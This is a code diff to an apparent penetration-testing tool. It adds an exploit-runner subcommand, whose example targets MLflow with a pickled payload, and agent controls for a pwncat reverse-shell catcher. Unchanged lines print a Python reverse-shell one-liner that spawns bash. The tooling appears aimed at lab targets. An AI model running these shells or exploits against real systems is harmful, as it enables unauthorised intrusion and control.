@@ -321,6 +321,36 @@ def cmd_run(args):
     sys.exit(r.returncode)
 
 
+def cmd_pyrun(args):
+    """Run a Python script in a version-pinned python:<ver>-slim, tunnel-aware.
+
+    The general-purpose exploit runner: cwd at /work, ./hosts mounted so lab
+    vhosts resolve, deps pip-installed into a cached volume, and ROO_NET honored
+    so it can hit a VPN-only target (under --network container:, the bind-mounted
+    /etc/hosts still resolves names). Pin --py to the *target's* Python when the
+    payload carries pickled code objects (cloudpickle/joblib/MLflow): a mismatch
+    fails with "code expected at most N arguments". Example:
+
+      ROO_NET=container:roorecon-vpn \\
+        roo pyrun --py 3.10 --pip "mlflow==2.14.1 requests" \\
+        recon-results/<target>/exploit/poison_model.py
+    """
+    require_docker()
+    ref = f"python:{args.py}-slim"
+    steps = []
+    if args.pip:
+        steps.append("pip install --quiet --disable-pip-version-check "
+                     f"--root-user-action=ignore {args.pip}")
+    invoke = " ".join(shlex.quote(a) for a in [args.script, *(args.rest or [])])
+    steps.append(f"python {invoke}")
+    inner = " && ".join(steps)
+    cache = ["-v", "roorecon-pip-cache:/root/.cache/pip"]
+    cmd = (["docker", "run", "--rm", "-i"]
+           + _net() + _hosts_mount() + _work_mount() + cache
+           + [ref, "sh", "-c", inner])
+    sys.exit(subprocess.run(cmd).returncode)
+
+
 # --- subcommand: sweep (streaming producer) ---------------------------------
 def cmd_sweep(args):
     require_docker()
@@ -1823,7 +1853,7 @@ def cmd_catch(args):
               f"s.connect((\"{tun}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
               f"pty.spawn(\"/bin/bash\")'")
         info("you drive:    roo catch attach        (detach with Ctrl-b d; session persists)")
-        info("agent drives: roo catch send <cmd>  ·  roo catch capture")
+        info("agent drives: roo catch enter (once a shell lands) then  send <cmd> · capture")
         info("files:        downloads land in .roo/catch/ ; stop with  roo catch down")
         return
 
@@ -1838,13 +1868,25 @@ def cmd_catch(args):
         ok(f"catcher(s) stopped: {', '.join(targets)}")
         return
 
-    # send/capture never take a port (rest is the command / empty); attach/status
-    # take an optional port in rest[0]. All require an existing catcher.
-    name = _catch_pick([] if action in ("send", "capture") else rest)
+    # send/capture take the command in `rest`, so they can't also take a positional
+    # port — select a specific catcher with $ROO_CATCH_PORT instead. attach/status/
+    # enter take an optional port in rest[0]. All require an existing catcher.
+    if action in ("send", "capture"):
+        sel = [os.environ["ROO_CATCH_PORT"]] if os.environ.get("ROO_CATCH_PORT") else []
+    else:
+        sel = rest
+    name = _catch_pick(sel)
 
     if action == "attach":
         r = subprocess.run(["docker", "exec", "-it", name, "tmux", "attach", "-t", "catch"])
         sys.exit(r.returncode)
+    if action == "enter":
+        # pwncat boots at its LOCAL prompt; Ctrl-D toggles into the target's PTY so
+        # subsequent `send` lands on the remote shell (not pwncat's command parser).
+        subprocess.run(["docker", "exec", name, "tmux", "send-keys", "-t", "catch", "C-d"])
+        info(f"sent Ctrl-D to {name} — should now be at the remote shell "
+             f"(verify with `roo catch capture`; toggle back with `enter` again)")
+        return
     if action == "status":
         ok(f"catcher {name} running — recent session output:")
         subprocess.run(["docker", "exec", name, "tmux", "capture-pane", "-pt", "catch", "-S", "-40"])
@@ -2123,6 +2165,16 @@ def build_parser():
     pr.add_argument("args", nargs=argparse.REMAINDER)
     pr.set_defaults(func=cmd_run)
 
+    ppy = sub.add_parser("pyrun",
+                         help="run a Python script in a pinned python:<ver>-slim (tunnel-aware, deps cached)")
+    ppy.add_argument("--py", default="3.12",
+                     help="Python version tag (default 3.12; match the TARGET for pickled-code payloads)")
+    ppy.add_argument("--pip", default="",
+                     help="space-separated packages to pip install first (e.g. \"mlflow==2.14.1 requests\")")
+    ppy.add_argument("script", help="path to the script (relative to cwd, which is mounted at /work)")
+    ppy.add_argument("rest", nargs=argparse.REMAINDER, help="args passed through to the script")
+    ppy.set_defaults(func=cmd_pyrun)
+
     for name, fn in (("sweep", cmd_sweep), ("recon", cmd_recon)):
         sp = sub.add_parser(name, help=fn.__doc__)
         sp.add_argument("target")
@@ -2241,10 +2293,13 @@ def build_parser():
 
     pcatch = sub.add_parser("catch",
                             help="persistent, shared reverse-shell catcher (pwncat in tmux)")
-    pcatch.add_argument("action", choices=["up", "attach", "status", "send", "capture", "down"],
-                        help="up [port] | attach [port] | status [port] | send <cmd...> | capture | down [port]")
+    pcatch.add_argument("action",
+                        choices=["up", "attach", "enter", "status", "send", "capture", "down"],
+                        help="up [port] | attach [port] | enter [port] | status [port] | "
+                             "send <cmd...> | capture | down [port]")
     pcatch.add_argument("rest", nargs=argparse.REMAINDER,
-                        help="port (up/attach/status/down) or command words (send)")
+                        help="port (up/attach/enter/status/down) or command words (send); "
+                             "for send/capture, pick a catcher with $ROO_CATCH_PORT")
     pcatch.set_defaults(func=cmd_catch)
 
     prs = sub.add_parser("responder",
